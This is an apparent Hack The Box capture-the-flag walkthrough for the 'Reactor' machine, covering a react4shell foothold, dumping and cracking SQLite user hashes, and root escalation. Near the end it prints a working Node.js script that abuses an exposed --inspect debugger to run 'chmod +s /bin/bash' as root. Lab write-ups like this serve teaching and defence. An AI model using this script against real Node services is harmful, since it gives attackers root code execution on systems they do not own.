Reactor is an easy Linux machine that dropped in Season 11 of HTB. (~~Honestly my least favourite machine~~)

# Foothold

An nmap scan shows two ports running, 22 for SSH and 3000 for an unknown signature but it says in the headers it is powered by Next.js. Hit the port in your browser and you are met with the Next.js web page, nothing to really enumerate however so don't waste your time with trying to find other directories or files. So you maybe asking, "how do I gain foothold?". It is in the machine name, it is a react4shell.

Run the exploit and you will gain a shell as a node, so you will need to get to move laterally for user.

# User

Thankfully, user is rather straight forward. The node runs the reverse shell code in the /opt/reactor-app directory, just ls and you will find a reactor.db file. Now I mistakenly cat'ed it instead of running it with sqlite which wasted alot of time where I looked else where. Run it properly with sqlite and retrieve user hashes.

node@reactor:/opt/reactor-app$ sqlite3 /opt/reactor-app/reactor.db
sqlite3 /opt/reactor-app/reactor.db
SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

Then I grabbed both hashes and cracked it online on crackstation for an instant crack, though only engineer will be cracked unsurprisingly. The password is reactor1, you can use it to SSH and then get the user flag.

# Root

My first instinct was to check if I can run any privileged commands but I couldn't run any as engineer, so I turned to see what processes were running on the server. One caught my eye even while I was still getting the move to user.

UID=0  PID=1419  | /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

UID 0 means it is owned by root, a clear PrivEsc path since `--inspect` enables the Chrome DevTools Protocol debugger on that process. Since it's running as root, any code you evaluate through the inspector runs as root — which is why `chmod +s /bin/bash` via that websocket gives you SUID bash. So I tunneled the port to my host machine and then I got to work.

The inspector WebSocket accepts `Runtime.evaluate` calls — essentially telling the remote Node.js process to execute arbitrary JavaScript.

You send `process.mainModule.require("child_process").execSync("chmod +s /bin/bash")` through the WebSocket — since the process is owned by root, that command runs as root.

The result?  `/bin/bash` gets the SUID bit set, so running `bash -p` on the target gives you a root shell regardless of your current user.

The core issue is `--inspect` should never be used in production, especially not as root, because anyone with local access can inject arbitrary code into the process.

Okay so now that you have a general idea how the exploit works you first need to grab the websocket uuid by hitting curl http://127.0.0.1:9229/json

Which returned:

"webSocketDebuggerUrl": "ws://127.0.0.1:9229/a1d112c9-5a2b-4ece-866e-b2c03528aaf5"

So on my Kali machine I wrote the exploit.

cat > ~/pwn.js << 'EOF'
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:9229/a1d112c9-5a2b-4ece-866e-b2c03528aaf5');
ws.on('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: 'process.mainModule.require("child_process").execSync("chmod +s /bin/bash").toString()'
    }
  }));
});
ws.on('message', (data) => {
  console.log(data.toString());
  ws.close();
});
EOF
//run the exploit with node
node ~/pwn.js

Then on the SSH session run bash -p and you get a root shell where you can then fetch the root flag.